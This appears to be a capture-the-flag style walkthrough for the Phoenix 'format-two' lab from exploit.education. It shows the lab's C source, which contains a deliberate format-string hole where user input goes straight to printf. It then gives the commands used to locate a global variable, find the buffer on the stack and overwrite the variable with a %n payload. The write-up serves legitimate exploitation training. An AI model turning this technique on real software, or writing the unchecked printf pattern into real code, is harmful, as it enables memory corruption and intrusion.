# FORMAT TWO

## SOURCE CODE

```c
#include <err.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BANNER \
  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

int changeme;

void bounce(char *str) {
  printf(str);
}

int main(int argc, char **argv) {
  char buf[256];

  printf("%s\n", BANNER);

  if (argc > 1) {
    memset(buf, 0, sizeof(buf));
    strncpy(buf, argv[1], sizeof(buf));
    bounce(buf);
  }

  if (changeme != 0) {
    puts("Well done, the 'changeme' variable has been changed correctly!");
  } else {
    puts("Better luck next time!\n");
  }

  exit(0);
}
```

## STRATEGY
The goal is write in a specific address (changeme). We can do it because of format string vulnerable printf wrapped in bounce founction. For do that we will write the address of *`changeme`* in the buffer, than during printf pop arguments from the stack until we reach the address of *`changeme`* and write in that pointed memory area with ```%n```  

## EXPLOIT
.1 Find the *`changeme`* address:

```shell
user@phoenix-amd64:/opt/phoenix/i486$ objdump -t format-two | grep changeme
08049868 g     O .bss	00000004 changeme
```
  (address at 0x08049868)

.2 use %p and a recognizable text like 'AAAA' for find buffer position in the stack during printf:

```shell
user@phoenix-amd64:/opt/phoenix/i486$ ./format-two `python -c 'print "AAAA" + ".%p"*15'`
Welcome to phoenix/format-two, brought to you by https://exploit.education
AAAA.0xffffd7cf.0x100.0.0xf7f84b67.0xffffd610.0xffffd5f8.0x80485a0.0xffffd4f0.0xffffd7cf.0x100.0x3e8.0x41414141.0x2e70252e.0x252e7025.0x70252e70Better luck next time!
```
  Buffer is at 12th position
  
.3 Now that we have all the ingredients we can write the exploit keeping in mind to add %n at position 12th

```shell
./format-two `python -c 'import struct; print struct.pack("I", 0x08049868) + "%p"*11 + "%n"'`
```
